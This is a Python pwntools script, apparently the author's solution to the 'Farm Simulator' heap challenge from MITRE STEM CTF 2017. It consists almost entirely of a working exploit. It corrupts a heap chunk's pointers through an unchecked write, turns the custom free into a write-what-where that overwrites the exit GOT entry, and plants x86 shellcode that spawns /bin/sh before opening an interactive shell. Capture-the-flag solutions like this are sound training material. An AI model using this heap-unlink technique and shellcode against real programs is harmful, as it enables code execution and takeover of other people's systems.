#!/usr/bin/env python
"""Farm Simulator Challenge Solution for MITRE STEM CTF 2017
Author: Eugene Kolodenker <eugene@eugenekolo.com>

* Requires understanding of a heap (alloc, unlink)
* The custom free acts as a write-what-where primitive. 
* There is no check that the amount being written is allocated.
"""

from pwn import *

ALLOC_BYTES_AMNT = 108
PAD_AMNT = 120
SHELLCODE_PAD_BYTES_AMNT = 0x400 - 0x18
SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
EXIT_GOT = 0x0804b020

context(arch='x86', os='linux')
p = process('./farm')

# Create 3 chunks (0, 1, 2)
p.sendline('1')
p.sendline('1')  # sz: 0x400 (goes into first child block)

p.sendline('1')
p.sendline(str(ALLOC_BYTES_AMNT))  # sz: 132 (108 (data) + 12 (header) + 12 (align))

p.sendline('1')
p.sendline('1')  # sz: don't care

# Add data to 1st chunk, overwriting the 2nd chunk's fd ptr
p.sendline('3')
p.sendline('1')
p.sendline(str(PAD_AMNT + 4 + len(p32(EXIT_GOT-8))))   # Extra 4 for the size
p.sendline('P'*PAD_AMNT + 'SSSS' + p32(EXIT_GOT-8))

# Free 2nd farm, writing EXIT_GOT-8 to the 1st chunk's fd ptr
# and writing the 2nd chunk's bk ptr (chunk 1) to EXIT_GOT
p.sendline('2')
p.sendline('2')

# Add data to 0th chunk, overwriting w/ garbage until the 1st chunk's bk ptr
p.sendline('3')
p.sendline('0')
p.sendline(str(SHELLCODE_PAD_BYTES_AMNT + len(SHELLCODE)))
p.sendline('P'*SHELLCODE_PAD_BYTES_AMNT + SHELLCODE)

p.sendline('1337')
p.interactive()
